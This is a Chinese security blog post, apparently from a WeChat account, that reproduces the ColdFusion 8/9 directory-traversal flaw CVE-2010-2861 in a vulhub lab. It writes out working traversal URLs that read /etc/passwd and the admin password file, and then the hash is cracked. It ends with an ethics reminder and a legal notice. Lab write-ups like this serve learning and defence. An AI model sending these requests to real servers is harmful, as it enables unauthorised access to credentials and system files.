#  Adobe ColdFusion 文件读取漏洞   
Zovt  巢安实验室   2024-10-17 23:23  
  
### 一、实验所需环境  
#### 1、Ubuntu  
#### 2、vulhub  
#### 3、coldfusion/CVE-2010-2861  
### 二、漏洞介绍  
  
Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。  
### 三、漏洞复现  
  
（1）进入vulhub，选择coldfusion/CVE-2010-2861漏洞环境，输入命令启动：docker-compose up -d![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxXqLjTBwMuavZVojNKy2yvJicTaMlQHoicicYnkgNfrb7VNxZUE1c4FCianw/640?wx_fmt=png&from=appmsg "")  
（2）环境启动可能需要1~5分钟，启动后，访问http://your-ip:8500/CFIDE/administrator/enter.cfm，可以看到初始化页面，输入密码admin，开始初始化整个环境。![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxXdxbOQjXbtNGEhyMGOdx26eNskJgS22excr7ed3XKPl3RIu0xuibHAfQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxXYyg32eWSAKQGZlreo8uJliaiaEM0ibjLBxVuQKOBsIo6GzaAVaVvR74vg/640?wx_fmt=png&from=appmsg "")  
（3）使用Burp Suite抓包，直接访问http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en，即可读取文件/etc/passwd：![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxXsZA6iaxnepY0ibZvp0BM50GicErnGOYRadufxYJAAmgj17Tq4iaLLNvzPQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxX6Gq8YPzjWxpgugfw2RibxoEzs7HUK5udaxPbL8xNFsRObwszoFLuDZQ/640?wx_fmt=png&from=appmsg "")  
（4）读取后台管理员密码http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en：![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxXZdFpCCumJKzGuNFWOCWWXkt9XobkUmF4C0zEhep1uQFRxIYkHv3vLQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxXHbVHb4aSFxy5RL9U4Q8esABJT3dKEP1ePau0mtPKDnfia8NsicA96x1A/640?wx_fmt=png&from=appmsg "")  
（5）将密文复制到解密网站进行解密，解密后获取文明密码为：admin![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVywWOc6xrwj3dz30BiamgyxX1iaiaTDM59p5V9nibuzQ6Q3L1xAf0D6RDia2kwg8tfPEmzR7ibgue39zZfQ/640?wx_fmt=png&from=appmsg "")  
  
### 参考链接：  
- https://github.com/vulhub/vulhub/blob/master/coldfusion/CVE-2010-2861  
  
- https://www.cnblogs.com/zovt/p/16342006.html  
  
真心感觉自己要学习的知识好多，也有好多大神卧虎藏龙、开源分享。作为初学者，我们可能有差距，不论你之前是什么方向，是什么工作，是什么学历，是大学大专中专，亦或是高中初中，只要你喜欢安全，喜欢渗透，就朝着这个目标去努力吧！有差距不可怕，我们需要的是去缩小差距，去战斗，况且这个学习的历程真的很美，安全真的有意思。但切勿去做坏事，我们需要的是白帽子，是维护我们的网络，安全路上共勉。  
  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
  
